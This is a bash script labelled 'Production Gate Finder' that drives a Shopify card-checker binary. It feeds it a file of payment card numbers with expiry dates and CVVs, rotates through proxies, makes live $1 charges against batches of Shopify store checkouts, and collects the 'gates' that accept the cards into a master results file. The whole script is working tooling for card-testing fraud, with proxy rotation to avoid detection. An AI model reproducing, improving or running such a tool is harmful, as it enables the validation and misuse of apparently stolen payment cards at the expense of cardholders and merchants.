#!/bin/bash

# Production Gate Finder - Uses ALL resources
# No more testing - this is LIVE

set -e

echo "═══════════════════════════════════════════════════════════"
echo "🚀 PRODUCTION GATE FINDER - LIVE MODE"
echo "═══════════════════════════════════════════════════════════"
echo ""

# Find cards file
CARDS_FILE=""
if [ -f "cards.txt" ]; then
    CARDS_FILE="cards.txt"
elif [ -f "../cards.txt" ]; then
    CARDS_FILE="../cards.txt"
elif [ -f "test_auth_cards.txt" ]; then
    CARDS_FILE="test_auth_cards.txt"
else
    echo "❌ ERROR: No cards file found!"
    echo "Please create cards.txt with your cards (format: number|month|year|cvv)"
    exit 1
fi

CARD_COUNT=$(wc -l < "$CARDS_FILE")
echo "✓ Found cards file: $CARDS_FILE ($CARD_COUNT cards)"

# Check proxies
if [ ! -f "proxies.txt" ]; then
    echo "❌ ERROR: proxies.txt not found!"
    exit 1
fi

PROXY_COUNT=$(wc -l < "proxies.txt")
echo "✓ Found proxies: $PROXY_COUNT proxies"

# Count chunks
CHUNK_COUNT=$(ls -1 ShopifyGatesAndChunks/*.txt 2>/dev/null | wc -l)
echo "✓ Found chunks: $CHUNK_COUNT chunk files"
echo ""

# Start ChromeDriver if not running
if ! pgrep -f chromedriver > /dev/null; then
    echo "→ Starting ChromeDriver..."
    chromedriver --port=9515 > /dev/null 2>&1 &
    sleep 2
    echo "✓ ChromeDriver started"
else
    echo "✓ ChromeDriver already running"
fi

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "CONFIGURATION"
echo "═══════════════════════════════════════════════════════════"
echo "Cards: $CARD_COUNT"
echo "Proxies: $PROXY_COUNT"
echo "Chunks: $CHUNK_COUNT"
echo "Mode: CHARGED (\$1 per valid gate)"
echo "Gates per chunk: 50"
echo ""

read -p "Start production run? (y/n): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Cancelled."
    exit 0
fi

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "🔥 STARTING PRODUCTION RUN"
echo "═══════════════════════════════════════════════════════════"
echo ""

# Create results directory
mkdir -p production_results
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS_DIR="production_results/$TIMESTAMP"
mkdir -p "$RESULTS_DIR"

# Process all chunks
TOTAL_VALID=0
TOTAL_COST=0
CHUNK_NUM=0

for chunk in ShopifyGatesAndChunks/*.txt; do
    CHUNK_NUM=$((CHUNK_NUM + 1))
    CHUNK_NAME=$(basename "$chunk")
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "📦 Chunk $CHUNK_NUM/$CHUNK_COUNT: $CHUNK_NAME"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Run checker
    ./target/release/shopify_checker rotate \
        --gates "$chunk" \
        --cards-file "$CARDS_FILE" \
        --proxy-file proxies.txt \
        --auth-only=false \
        --max-gates 50 \
        --output "$RESULTS_DIR/${CHUNK_NAME%.txt}_results.json" \
        2>&1 | tee "$RESULTS_DIR/${CHUNK_NAME%.txt}_log.txt"
    
    # Count valid gates from this chunk
    if [ -f "$RESULTS_DIR/${CHUNK_NAME%.txt}_results.json" ]; then
        VALID=$(jq '[.[] | select(.status == "CHARGED")] | length' "$RESULTS_DIR/${CHUNK_NAME%.txt}_results.json" 2>/dev/null || echo "0")
        TOTAL_VALID=$((TOTAL_VALID + VALID))
        TOTAL_COST=$((TOTAL_COST + VALID))
        
        echo ""
        echo "✓ Chunk complete: $VALID valid gates found"
        echo "💰 Cost this chunk: \$$VALID.00"
        echo "📊 Total so far: $TOTAL_VALID gates, \$$TOTAL_COST.00"
    fi
    
    echo ""
    echo "⏸️  Waiting 10 seconds before next chunk..."
    sleep 10
done

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "✅ PRODUCTION RUN COMPLETE"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "📊 FINAL STATISTICS:"
echo "  • Chunks processed: $CHUNK_COUNT"
echo "  • Valid gates found: $TOTAL_VALID"
echo "  • Total cost: \$$TOTAL_COST.00"
echo "  • Average per chunk: $((TOTAL_VALID / CHUNK_COUNT)) gates"
echo ""
echo "📁 Results saved to: $RESULTS_DIR/"
echo ""

# Merge all results
echo "→ Merging all results..."
jq -s 'add' "$RESULTS_DIR"/*_results.json > "$RESULTS_DIR/ALL_VALID_GATES.json" 2>/dev/null || true

if [ -f "$RESULTS_DIR/ALL_VALID_GATES.json" ]; then
    UNIQUE_GATES=$(jq '[.[] | .gate] | unique | length' "$RESULTS_DIR/ALL_VALID_GATES.json")
    echo "✓ Merged results: $UNIQUE_GATES unique valid gates"
    echo ""
    echo "📄 Master file: $RESULTS_DIR/ALL_VALID_GATES.json"
fi

echo ""
echo "🎉 Production run complete! Check results directory for details."
